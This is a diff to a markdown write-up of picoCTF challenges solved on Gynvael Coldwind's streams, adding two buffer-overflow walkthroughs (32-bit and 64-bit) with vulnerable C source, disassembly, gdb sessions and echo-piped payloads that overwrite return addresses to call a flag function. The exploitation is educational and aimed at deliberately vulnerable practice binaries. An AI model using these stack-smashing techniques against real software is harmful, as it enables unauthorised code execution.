@@ -56,7 +56,8 @@ Title                                                                      | Cat
 
 ## Credits
 All the credit goes to [Gynvael Coldwind](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg) for making these streams. Check him out.  
-I based the table format above on [this](https://github.com/shiltemann/CTF-writeups-public/blob/master/PicoCTF_2018/writeup.md#overview).
+I based the table format above on [this](https://github.com/shiltemann/CTF-writeups-public/blob/master/PicoCTF_2018/writeup.md#overview).  
+J.V. for the timestamps in Parts 2, 3, and 4.
 
 ## The Factory's Secret - General Skills
 Gynvael gave up on this. Maybe it was too easy.
@@ -1132,11 +1133,176 @@ Gynvael uses the [RX-SSTV](http://users.belgacom.net/hamradio/rxsstv.htm) progra
 
 SSTV is something you learn from CTFs and should know for CTFs.
 
+## Overflow2 - Binary Exploitation
+gets() is the vulnerable function which means any character in our input except '\n' (on windows other characters would be disallowed like Ctrl-D) 
+
+We want to call flag() since that prints out the flag, but we see that it checks for function arguments.  
+
+We have to push the flag function's arguments onto the stack as well as overwrite the return address with the address of the flag function in order to execute the flag function.
+```c
+void flag(unsigned int arg1, unsigned int arg2) {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  if (arg1 != 0xDEADBEEF)
+    return;
+  if (arg2 != 0xC0DED00D)
+    return;
+  printf(buf);
+}
+```
+
+Here's a diagram of what the stack should look like when the ret instruction is called (when vuln() returns):
+```
+0x080485E6 # This is the address of flag(), the address we want to jump to
+Saved EBP # We can fill this with junk (AAAA in this case). This is where the above function will go to when it returns
+0xDEADBEEF # Argument 1
+0xC0DED00D # Argument 2
+```
+
+```
+$ echo -e '\xE6\x85\x04\x08\x41\x41\x41\x41\xEF\xBE\xAD\xDE\x0D\xD0\xDE\xC0'
+```
+ 
+We still need to add some characters at the beginning to overflow the buffer. The amount of characters will probably be larger than the buffer length.
+```
+$ echo -e 'DDDDCCCCBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xE6\x85\x04\x08\x41\x41\x41\x41\xEF\xBE\xAD\xDE\x0D\xD0\xDE\xC0' | ./vuln
+Please enter your string:
+DDDDCCCCBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ
+picoCTF{arg5_and_r3turn5001d1db0}Segmentation fault (core dumped)
+```
+We needed BUFLENGTH + 12 characters.
+
+## NewOverFlow-1 - Binary Exploitation
+#### 64-bit exploitation  
+* 8 bytes instead of 4 bytes  
+* Calling convention (arguments are in registers sometimes) 
+
+Pretty much the same thing as the 32 bit one.  
+
+Get the address of the flag:
+```console
+$ objdump -x vuln # Just display all the functions and things in the binary
+...
+0000000000000000       F *UND*  0000000000000000              fopen@@GLIBC_2.2.5
+0000000000000000       F *UND*  0000000000000000              exit@@GLIBC_2.2.5
+0000000000601070 g     O .data  0000000000000000              .hidden __TMC_END__
+0000000000400767 g     F .text  0000000000000065              flag
+00000000004005c8 g     F .init  0000000000000000              _init
+``` 
+
+We see that the address of flag() is 0x0000000000400767. The null bytes wont' affect gets() since gets() only ends at a newline.  
+
+Our exploit format:
+```
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # Padding to reach the saved return address (Right now we don't know how many A's to use to pad it)
+\x67\x07\x40\x00\x00\x00\x00\x00 # Address of flag() in little endian which overwrites whatever saved return address there was
+```
+
+Previously, we just guessed how much padding to add to overwrite the return addres, now Gynvael looks at the disassembly of the binary to see if we can calculate how many A's we need to overwrite the return address with the address of flag.   
+
+Note: In the stream Gynvael looks at the flag() function disasssembly by mistake when he should in fact look at the vuln() function's disassembly to make the exploit since that's the function that calls gets(). 
+
+```console
+$ objdump -Mintel -d vuln
+...
+00000000004007cc <vuln>:
+  4007cc:       55                      push   rbp
+  4007cd:       48 89 e5                mov    rbp,rsp
+  4007d0:       48 83 ec 40             sub    rsp,0x40
+  4007d4:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  4007d8:       48 89 c7                mov    rdi,rax
+  4007db:       b8 00 00 00 00          mov    eax,0x0
+  4007e0:       e8 4b fe ff ff          call   400630 <gets@plt>
+  4007e5:       90                      nop
+  4007e6:       c9                      leave
+  4007e7:       c3                      ret
+...
+```
+
+As we can see from the disassembly above, when the `ret` instruction is called, the stack will look something like this:
+```
+[saved return address]
+[saved rbp]
+[0x40 bytes for buf]
+```
+So we need 64 A's to overwrite the buffer and then another 8 A's to overwrite the saved rbp for a total of 72. Then we can overwrite the saved return address with the address of flag().   
+
+Exploit
+```console
+$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40\x00\x00\x00\x00\x00" | ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag:
+Segmentation fault (core dumped)
+```
+
+However, when the above, it doesn't seem to work. Let's run it in gdb:
+```console
+$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40\x00\x00\x00\x00\x00" > ~/asdf # save the exploit to a file
+$ gdb ./vuln
+(gdb) r < ~/asdf # Run the program in gdb with the file's contents as our input
+Starting program: /problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/vuln < ~/asdf
+Welcome to 64-bit. Give me a string that gets you the flag:
+'flag.txt' missing in the current directory!
+[Inferior 1 (process 2882877) exited normally]
+```
+It looks like the exploit actually worked in gdb. When you run a program using gdb it drops the permissions from the original binary which is why you have the program couldn't find flag.txt. The exploit worked in gdb but not outside of it because running a program in gdb changes the environment and program a little bit. Running the exploit locally also succeeds, but running on the shell server outside of gdb fails because there might be slight differences there.  
+
+To confirm that we're actually overwriting the return address on the shell server outside of gdb, we can look for an instruction/function in the binary that will allow us to see if we have control of the return address. Gynvael looks for the 0xEBFE or infinite loop instruction in the binary, but there isn't one. Instead we can try calling `puts("Welcome to 64-bit. Give me a string that gets you the flag: ");` since that will show us if we overwrite the return address. This technique is a common strategy for confirming that we have control of the return address.  
+
+These two lines are what we want called to call the puts() function in main().
+```
+$ objdump -Mintel -d vuln
+...
+  400834:       48 8d 3d ed 00 00 00    lea    rdi,[rip+0xed]        # 400928 <_IO_stdin_used+0x48>
+  40083b:       e8 b0 fd ff ff          call   4005f0 <puts@plt>
+...
+```
+
+We want to call address 0x400834 since we need to load the string into rdi as a parameter before calling puts. Use that as the return address we're overwriting.
+```console
+$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x08\x40\x00\x00\x00\x00\x00" | ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag:
+Welcome to 64-bit. Give me a string that gets you the flag:
+Bus error (core dumped)
+```
+
+We can see that the welcome message was printed twice, indidcating that we did indeed call puts by overwriting the stored return address on the stack. This confirms that we had the right amount of padding to overwrite the return address even though it seems ovewriting the return address with the address of flag() didn't work.  
+
+The next technique we can try is using the address instruction after the start of flag() instead of the address of flag().
+```assembly
+0000000000400767 <flag>:
+  400767:       55                      push   rbp # Instead of calling this
+  400768:       48 89 e5                mov    rbp,rsp # we can maybe call this address
+  40076b:       48 83 ec 50             sub    rsp,0x50 # or maybe even this one
+  40076f:       48 8d 35 72 01 00 00    lea    rsi,[rip+0x172]        # 4008e8 <_IO_stdin_used+0x8>
+```
+
+Let's try 0x400768 instead of 0x400768 (address of flag()).
+```console
+$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x68\x07\x40\x00\x00\x00\x00\x00" | ./vuln
+Welcome to 64-bit. Give me a string that gets you the flag:
+picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}
+Segmentation fault (core dumped)
+```
+
+For some reason the program was crashing on the `push rbp` instruction (probably due to stack alignment).  
+
+
+
+## like1000 - Forensics
+
 ## Random other stuff Gynvael says about solving ctf challenges during the stream
 * He recommends kaitai struct for stegno challenges (Part 1: 46:39)
 * Recommends pdfstreamdumper
 * Thumbnails can store info
 * For network dumps there are two main tools: Wireshark and NetworkMiner
+* Gynvael recommends working on ctf challenges remotely in most cases since in many cases an exploit could work locally but not remotely (like in the above case).
+* On 64-bit binary exploitation challenges, when passing parameters to functions, ROP is usually the way to get the proper values into registers.
 
 ## TODO 
 * Fix all the weird non ascii apostrophes and double quotes
